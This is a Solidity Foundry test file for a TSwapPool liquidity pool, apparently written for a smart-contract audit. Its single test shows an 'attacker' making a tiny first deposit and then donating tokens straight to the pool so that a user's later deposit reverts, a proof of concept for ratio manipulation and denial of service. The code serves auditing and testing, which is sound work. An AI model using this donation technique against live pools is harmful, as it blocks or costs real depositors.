// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 200e18);
        poolToken.mint(user, 200e18);

        weth.mint(attacker, 200e18);
        poolToken.mint(attacker, 200e18);
    }

    function testDonateTokens() public {
        // initial deposit
        vm.startPrank(attacker);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);
        pool.deposit(1e9, 1e9, 1e9, uint64(block.timestamp));


        // user is expecting to deposit some value
        uint userWethToDeposit = 1e18;
        uint userTokensToDeposit = pool.getPoolTokensToDepositBasedOnWeth(userWethToDeposit);


        console.log(pool.getPoolTokensToDepositBasedOnWeth(10e18));

        // attacker donate tokens to the pool
        vm.startPrank(attacker);
        poolToken.transfer(address(pool), 1e18);

        // user wants to provide liquidity
        vm.startPrank(user);
        vm.expectRevert();
        pool.deposit(userWethToDeposit, 0, userTokensToDeposit, uint64(block.timestamp));
    }
}
